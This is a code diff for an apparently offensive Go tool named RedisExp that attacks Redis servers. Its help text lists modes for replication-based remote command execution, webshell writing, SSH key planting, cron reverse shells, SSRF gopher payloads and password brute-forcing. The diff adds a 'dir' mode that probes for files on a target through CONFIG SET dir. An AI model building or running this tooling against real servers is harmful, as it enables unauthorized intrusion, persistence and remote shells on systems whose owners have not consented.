@@ -8,9 +8,6 @@ import (
 	"encoding/hex"
 	"flag"
 	"fmt"
-	"github.com/redis/go-redis/v9"
-	"golang.org/x/text/encoding/simplifiedchinese"
-	"golang.org/x/text/transform"
 	"io"
 	"io/ioutil"
 	"net"
@@ -19,6 +16,10 @@ import (
 	"strings"
 	"sync"
 	"time"
+
+	"github.com/redis/go-redis/v9"
+	"golang.org/x/text/encoding/simplifiedchinese"
+	"golang.org/x/text/transform"
 )
 
 var ctx = context.Background()
@@ -32,7 +33,21 @@ var (
 )
 
 func init() {
-	flag.StringVar(&modules, "m", "", "利用模式(rce,upload,shell,ssh,cron,cve,gopher,brute,close,bgsave)")
+
+	help := `
+rce     主从复制命令执行
+upload  主从复制文件上传
+close   手动关闭主从复制
+shell   写 webshell
+ssh     写 ssh 公钥
+cron    写 计划任务反弹shell
+gopher  生成 ssrf  gopher
+brute   爆破 redis 密码
+bgsave  执行 bgsave 命令
+dir     探测文件是否存在
+	`
+
+	flag.StringVar(&modules, "m", "", "利用模式(rce,upload,shell,ssh,cron,cve,gopher,brute,close,bgsave,dir)"+help)
 	flag.StringVar(&rhost, "r", "", "目标IP")
 	flag.StringVar(&rport, "p", "6379", "目标端口")
 	flag.StringVar(&lhost, "L", "", "本地IP | VPS IP")
@@ -176,6 +191,21 @@ func main() {
 				fmt.Println("[OK]\tbgsave")
 			} else {
 				fmt.Println("[==]\tbg")
+			}
+
+		case "dir":
+			if rpath == "." {
+				fmt.Println("参数错误: RedisExp.exe -m dir -r 目标IP -p 目标端口 -w 密码 -rp 文件路径")
+				return
+			}
+			res := configSet("dir", rpath)
+
+			if res == "ERR Changing directory: Not a directory" {
+				fmt.Println("文件存在", res)
+			} else if res == "ERR Changing directory: No such file or directory" {
+				fmt.Println("文件不存在", res)
+			} else {
+				fmt.Println("执行成功 config set dir", rpath)
 			}
 
 		default:
